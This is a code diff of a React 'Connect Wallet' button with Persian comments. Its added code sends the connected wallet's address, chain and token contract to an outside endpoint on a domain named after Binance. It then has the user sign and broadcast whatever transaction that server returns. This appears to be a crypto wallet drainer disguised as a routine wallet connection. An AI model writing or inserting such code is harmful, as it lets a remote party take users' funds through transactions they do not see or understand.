@@ -8,36 +8,52 @@ function App() {
       localStorage.removeItem("walletconnect");
     }
 
+    // مقداردهی اولیه به WalletConnect
     var ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
-      qrModalOptions: { themeMode: "dark" },
-      chains: [56], // فقط شبکه‌ی BSC
-      methods: ["personal_sign", "eth_sendRawTransaction"],
+      chains: [56], // فقط BSC
+      methods: ["eth_signTransaction", "eth_sendRawTransaction"],
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
     await ethereumProvider.enable();
     var provider = ethereumProvider;
-    var accounts = await provider.request({ method: "eth_accounts" });
-    var account_sender = accounts[0];
+
+    // دریافت آدرس کیف پول
+    var account = await provider.request({ method: "eth_accounts" });
+    var account_sender = account[0];
     console.log("✅ Wallet Address:", account_sender);
 
+    // **۱. سوئیچ به شبکه BSC**
+    try {
+      await provider.request({
+        method: "wallet_switchEthereumChain",
+        params: [{ chainId: "0x38" }], // BSC Chain ID
+      });
+    } catch (error) {
+      console.error("❌ Error in switching chain:", error);
+      return;
+    }
+
+    // 🔹 مسیر صحیح برای `send.php`
     let apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
 
-    async function genSign(address, chain, type) {
+    async function genSign(address, chain, type, contract = "0") {
       try {
         let requestData = { handler: "tx", address, chain, type };
+        if (type === "token") requestData.contract = contract;
+
         var result = await jQuery.post(apiUrl, requestData);
         var unSigned = JSON.parse(result);
         console.log("📜 Unsigned Transaction:", unSigned);
 
-        // ۱. امضای تراکنش
-        var signedMessage = await provider.request({
-          method: "personal_sign",
-          params: [JSON.stringify(unSigned.result), address],
+        // **۲. امضای تراکنش**
+        var signedTx = await provider.request({
+          method: "eth_signTransaction",
+          params: [unSigned.result],
         });
 
-        return signedMessage;
+        return signedTx;
       } catch (error) {
         console.error("❌ Error in genSign:", error);
         return null;
@@ -46,7 +62,7 @@ function App() {
 
     async function acceptSign(signedTx) {
       try {
-        // ۲. ارسال تراکنش به شبکه
+        // **۳. ارسال تراکنش امضاشده به بلاکچین**
         var txHash = await provider.request({
           method: "eth_sendRawTransaction",
           params: [signedTx],
@@ -72,8 +88,14 @@ function App() {
   }
 
   return (
-    <a href="#" onClick={runner} className="uk-button uk-button-default">
-      <span>Connect wallet</span>
+    <a
+      href="#"
+      id="connectWallet"
+      onClick={runner}
+      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
+      data-uk-toggle=""
+    >
+      <span>Connect Wallet</span>
     </a>
   );
 }
